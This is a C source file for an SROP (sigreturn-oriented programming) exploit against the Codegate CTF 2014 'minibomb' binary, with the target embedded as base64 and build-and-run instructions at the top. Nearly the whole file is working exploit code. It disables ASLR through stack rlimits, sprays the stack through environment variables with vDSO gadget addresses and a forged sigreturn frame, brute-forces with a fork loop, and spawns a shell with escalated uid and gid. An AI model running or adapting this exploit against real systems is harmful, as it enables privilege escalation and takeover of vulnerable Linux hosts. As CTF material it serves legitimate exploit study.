/*

  nux.c, Neighbourly Universal eXploit

  SROP for Linux i386 by brainsmoke

  ( as applied to codegate CTF 2014 prequals minibomb binary: )

  base64 -di << '  EOF' | zcat > minibomb ; chmod +x minibomb
    H4sIABL3CFMAA6t39XFjZGRkgAEmBmYGEG9BAwuHCYiGSpkwKABlNBhYoPJgAFQDwn5AARBmBYkJ
    MIDlA4BEwEQWDhC2APJBmA0qH/i0JIUBC2CDSKOAzge8//8zMDjoMggwMXQe3REFFOuVBZl6tqF3
    wRF+BoYd0SBlr3eCFJxtMHz7QhnI38ECUsdbDFS3ix3I3A1y09mGHSBqNwOY3fxGAKoqA6SKC0kV
    M8jEh7tAjoEq3sGG0AjVVQ3SxYPQ1XxE4DDU0UB9ICOUgPj/f5DzGRgKEouLk/NTUq0UGJz8/X0V
    FbkYkjNSk7Mz89L19PSAlusVZxSXFJUkJjHolaRWlDDopSSWJGILJeyAmwES7mzQuFsApNchycPC
    VRCqDuQ+cPwwQuIGBligNEwNDHQABcSR+LAUAwCh7aW1QAIAAA==
  EOF

  gcc -m32 -o nux nux.c ; ./nux ./minibomb

 */

#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/resource.h>
#include <sys/wait.h>

#define VDSO_BASE 0x40000000 /* adjust this to match size of ld.so */

/* consts */

#define DATA_SEG     0x7b
#define CODE_SEG     0x73
#define TLS_SEG      0x33
#define EXECVE       11
#define _            0

/* universal SROP */

#define SIGRETURN    (VDSO_BASE + 0x400)
#define INT80        (VDSO_BASE + 0x406)
#define RET          (VDSO_BASE + 0x427)

#define SYSENTER     (VDSO_BASE + 0x419)
#define POPEBP(val)  (VDSO_BASE + 0x424), val, -1, -1

#define FILENAME     (VDSO_BASE + 0x1d2) /* nux */

#define STACKPIVOT(newstack) POPEBP(newstack-12), SYSENTER

/* exploit specific */

#define NEWSTACK     (0xbffdfff0)
//#define NEWSTACK     (0xfffdfff0)

long payload[] = { _, _, _, _, STACKPIVOT(NEWSTACK) };

/* SROP */

long srop[]=
{
	/* __kernel_sigreturn */
	     SIGRETURN,
	/*    signo      |      gs       |      fs       |      es       */
	        _,            TLS_SEG,           _,           DATA_SEG,
	/*      ds       |      arg5     |     arg4      |     arg6      */
	     DATA_SEG,           _,              _,              _,
	/*      sp       |      arg1     |     arg3      |     arg2      */
	        _,            FILENAME,          _,              _,
	/*    callno     |               |               |    syscall    */
	      EXECVE,            _,              _,            INT80,
	/*      cs       |               |               |      ss       */
	     CODE_SEG,           _,              _,           DATA_SEG,
	/* fpstate NULL  |    sigmask    |      cr2      */
	        _,               _,              _,
};




/* put arbitrary binary data on the stack */
int execvb(char *filename, char **argv,
           char *bindata, unsigned long size,
           unsigned long ptrsize, unsigned long alignment)
{
    unsigned long c, i;

    for (c=0,i=0; i<size; i++)
        if (bindata[i] == '\0')
            c++;

    char **envp = malloc( (c+3) * sizeof(char *) );

    envp[0] = &bindata[0];
    for (c=0,i=0; i<size; i++)
        if (bindata[i] == '\0')
            envp[++c] = &bindata[i+1];

    unsigned long datasize = size + strlen(filename)+2 + ptrsize,
                  padlen = alignment - ( datasize % alignment ),
                  lastsize = &bindata[size] - envp[c];

    char *last = malloc(lastsize+padlen+1);
    memcpy(last, envp[c], lastsize);
    memset(&last[lastsize], 'A', padlen);
    last[lastsize+padlen] = '\0';

    envp[c] = last;
    envp[c+1] = NULL;

    int ret = execve(filename, argv, envp);

    free(envp);
    free(last);

    return ret;
}


int main(int argc, char *argv[])
{
	if (argc == 0)
	{
	    dup2(open("/dev/tty", O_RDONLY), 0);
	    dup2(open("/dev/tty", O_RDWR), 1);
	    dup2(open("/dev/tty", O_RDWR), 2);
		setresuid(geteuid(), geteuid(), geteuid());
		setresgid(getegid(), getegid(), getegid());
		execl("/bin/sh", "sh", NULL);
		exit(1);
	}

	#define BLEN 0x10000
	long *buf = malloc(BLEN*sizeof(long));
	int i;
	for (i=BLEN/2; i<BLEN-0x200; i++)
		buf[i] = RET;

	memcpy(&buf[BLEN-0x200], srop, sizeof(srop));

	int filedes[2];
	pipe(filedes);
	dup2(filedes[0],0);

	/* disable ASLR */
	setrlimit(RLIMIT_STACK, &(struct rlimit){RLIM_INFINITY, RLIM_INFINITY});

	for(;;)
	{
		write(filedes[1], payload, sizeof(payload));
		if (fork()==0)
			execvb(argv[1], NULL, (char*)buf, BLEN*sizeof(long), 4, 16);
		else
			wait(NULL);
	}
}
